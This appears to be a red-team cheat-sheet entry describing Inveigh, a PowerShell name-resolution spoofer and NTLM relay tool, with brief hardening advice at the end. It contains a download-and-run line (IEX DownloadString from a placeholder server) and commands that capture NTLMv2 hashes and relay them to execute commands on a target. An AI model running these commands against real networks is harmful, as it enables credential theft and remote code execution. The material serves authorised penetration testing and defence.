[Inveigh](https://github.com/Kevin-Robertson/Inveigh) is a PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer and man-in-the-middle tool designed to assist penetration testers/red teamers that find themselves limited to a Windows system.

At its core, Inveigh is a .NET packet sniffer that listens for and responds to LLMNR/mDNS/NBNS/DNS requests while also capturing incoming NTLMv1/NTLMv2 authentication attempts over the Windows SMB service.

Since the .NET packet sniffer **requires elevated privilege**, Inveigh also contains UDP listener based LLMNR/mDNS/NBNS/DNS functions.

By default, Inveigh will attempt to detect the privilege level and load the corresponding functions.

Inveigh provides NTLMv1/NTLMv2 HTTP/HTTPS/Proxy to SMB2.1 relay through the Inveigh Relay module. This module does not require elevated privilege, again with the exception of HTTPS, on the Inveigh host.

```powershell
# Load into memory using Invoke-Expression
IEX (New-Object Net.WebClient).DownloadString("http://SERVER/Inveigh.ps1")
IEX (New-Object Net.WebClient).DownloadString("http://SERVER/Inveigh-Relay.ps1")
# Enable inspection only and real time console output
Invoke-Inveigh -Inspect -ConsoleOutput Y
# Enable the NBNS and mDNS spoofers
Invoke-Inveigh -NBNS Y -mDNS Y
# Get all captured NTLMv2 challenge/response hashes
Get-Inveigh -NTLMv2
# Invoke a command on a given target 
Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target TARGET_IP -Command "COMMAND" -Attack Enumerate,Execute,Session
```

https://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-and-replay-them/

:white_check_mark: How to protect against or detect that technique:

- *Architecture*: Allow as less as possible any NTLM authentication to occur on the network
- *Architecture*: Enable SMB signing on all devices that are capables of supporting this feature in order to allows the devices to conform the point of origin and authenticity of each SMB packet. (This can cause performance issue)
